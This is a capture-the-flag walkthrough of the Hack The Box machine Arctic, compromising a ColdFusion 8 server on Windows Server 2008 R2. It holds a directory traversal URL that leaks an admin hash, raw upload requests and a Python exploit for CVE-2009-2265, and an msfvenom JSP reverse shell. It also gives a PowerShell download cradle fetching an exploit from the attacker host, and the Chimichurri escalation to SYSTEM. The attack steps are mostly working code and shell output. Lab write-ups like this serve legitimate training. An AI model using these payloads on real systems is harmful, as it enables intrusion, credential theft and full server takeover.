# HTB Arctic 10.10.10.11


- OS Name:                   Microsoft Windows Server 2008 R2 Standard 
- OS Version:                6.1.7600 N/A Build 7600
- No Hotfix


- Coldfusion 8 CVE-2010-2861 - Directory traversal
- Coldfusion 8 CVE-2009-2265 Arbitrary File Upload / Execution

- MS10-092 Schelevator (meterpreter)
- MS10-059 Chimichurri (*.exe)

- powershell transfert



## Walkthrough

https://medium.com/@chennylmf/hackthebox-walkthrough-arctic-e0ae709fc121


## nmap => 8500

```
# nmap -sC -sV -A 10.10.10.11
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-03 21:41 CEST
Nmap scan report for 10.10.10.11
Host is up (0.049s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   48.78 ms 10.10.14.1
2   54.29 ms 10.10.10.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.01 seconds
root@kali:~# 
```

=> 8500


## port 8500 : Coldfusion

http://10.10.10.11:8500/CFIDE
http://10.10.10.11:8500/CFIDE/administrator

Coldfusion 8 Administrator GUI

## Coldfusion 8 CVE-2010-2861 - Directory traversal

https://www.exploit-db.com/exploits/14641

http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en

=> Encrypted password : 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03


````
$ hash-identifier 
HASH: 2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03

Possible Hashs:
[+]  SHA-1
````

=> decrypt : happyday


## Use Coldfusion to upload file

upload files via Scheduled Tasks under the Debugging & Logging Category.
The scheduled task setup gives you the ability to download a file from a webserver and save the output locally. Under Mappings, we can verify the CFIDE path, so we know where we can save a shell.


    Set the URL to our webserver hosting the JSP shell
    Check the box for Save output to a file
    Set File to C:\ColdFusion8\wwwroot\CFIDE\shell.jsp

After submitting we run the task on demand under Actions, and we can see the 200 reponse on our python http server.

Fire up a netcat listener and we can now browse to our shell at http://10.10.10.11:8500/CFIDE/shell.jsp
   
    
 
## Coldfusion 8 CVE-2009-2265 Arbitrary File Upload / Execution

https://www.exploit-db.com/exploits/16788

=> metasploit

=> script : https://www.codewatch.org/blog/?p=299

Upload file
````
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/
  upload.cfm?Command=FileUpload&Type=File&CurrentFolder=%2f HTTP/1.0
  Host: 111.111.11.11
  Content-Length: 142
  Content-Type: multipart/form-data; boundary=o0oOo0o
  Connection: close

  --o0oOo0o
  Content-Disposition: form-data; name="NewFile"; filename="command.txt"
  Content-Type: text/html

  Command Test File
  --o0oOo0o--
````

Execute : whoami.exe

````
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/
  upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/who.cfm%00 HTTP/1.0
  Host: 111.111.11.11
  Content-Length: 287
  Content-Type: multipart/form-data; boundary=o0oOo0o
  Connection: close

  --o0oOo0o
  Content-Disposition: form-data; name="NewFile"; filename="who.txt"
  Content-Type: text/plain

  <cfsetting enablecfoutputonly="yes" showdebugoutput="no">
  <cfexecute name="whoami.exe" arguments="" timeout="30" variable="pwned"/>
  <cfoutput>#pwned#</cfoutput>
  --o0oOo0o--
````

````
  POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/
  upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/cfdownload.cfm%00 
  HTTP/1.0
  Host: 111.111.11.11
  Content-Length: 278
  Content-Type: multipart/form-data; boundary=o0oOo0o
  Connection: close

  --o0oOo0o
  Content-Disposition: form-data; name="NewFile"; filename="cfdownload.txt"
  Content-Type: text/plain

  <cfsetting enablecfoutputonly="yes" showdebugoutput="no">
  <cfhttp method="get" url="https://1.1.1.1/pwned.exe" path="c:\" file="pwned.exe" />
  --o0oOo0o--
````
 
This will create a file called ‘cfdownload.cfm’ located in the ‘/userfiles/files/’ directory on the server that when executed will access the file hosted at ‘https://1.1.1.1/pwned.exe’ and then save it to the ‘C:\’ drive on the victim server as ‘pwned.exe.



## Upload script : CVE-2009-2265.py

````
#!/usr/bin/python
# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2017-10-16
# Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265 
# 
# Description: 
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
#
# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
import requests, sys

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    if len(sys.argv) == 5:
        path = sys.argv[3]
        with open(sys.argv[4], 'r') as payload:
            body=payload.read()
    else:
        path = ""
        with open(sys.argv[3], 'r') as payload:
            body=payload.read()
except IndexError:
    print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>'
    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
    sys.exit(-1)

basepath = "http://" + ip + ":" + port + path

print 'Sending payload...'

try:
    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
    if req.status_code == 200:
        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'
    else:
        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason
except requests.Timeout:
    print 'Failed to upload payload... Request timed out'
````




## Reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.30 LPORT=9000 -f raw > reverseshell.jsp

Upload it
```
./CVE-2009-2265.py 10.10.10.11 8500 reverseshell.jsp
Sending payload...
Successfully uploaded payload!
Find it at http://10.10.10.11:8500/userfiles/file/exploit.jsp

```

Run it
```
$ curl http://10.10.10.11:8500/userfiles/file/exploit.jsp
```

Netcat
```
# nc -lvp 9000
listening on [any] 9000 ...
10.10.10.11: inverse host lookup failed: Unknown host
connect to [10.10.14.30] from (UNKNOWN) [10.10.10.11] 49262
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
c:\> type \Users\tolis\Desktop\user.txt
XXXXXXXXXXXXXXX
```

## post/multi/recon/local_exploit_suggester



## systeminfo

````
C:\>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00477-001-0000421-84900
Original Install Date:     22/3/2017, 11:09:45   
System Boot Time:          29/12/2017, 3:34:21   
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 88 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.085 MB
Virtual Memory: In Use:    963 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
````


## MS10-092 Schelevator


meterpreter : exploit/windows/local/ms10_092_schelevator
=> Admin




## MS10-059 - Chimichurri 

https://www.exploit-db.com/exploits/14610/ : src

https://github.com/Re4son/Chimichurri : .exe
```
wget https://github.com/Re4son/Chimichurri/raw/master/Chimichurri.exe
```

Download chimichurri.exe
````
C:\>echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\>echo $url = "http://10.10.14.30:8000/Chimichurri.exe" >>wget.ps1
C:\>echo $file = "exploit.exe" >>wget.ps1
C:\>echo $webclient.DownloadFile($url,$file) >>wget.ps1

C:\>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
````

start a netcat listener, and run the exploit.

````
C:\ColdFusion8>exploit.exe 10.10.14.30 443

/Chimichurri/-->This exploit gives you a Local System shell 
/Chimichurri/-->Changing registry values...
/Chimichurri/-->Got SYSTEM token...
/Chimichurri/-->Running reverse shell...
/Chimichurri/-->Restoring default registry values...
````

````
# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.11] 49267
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8>whoami & hostname
whoami & hostname
nt authority\system
arctic

C:\Users\Administrator\Desktop>type root.txt

````




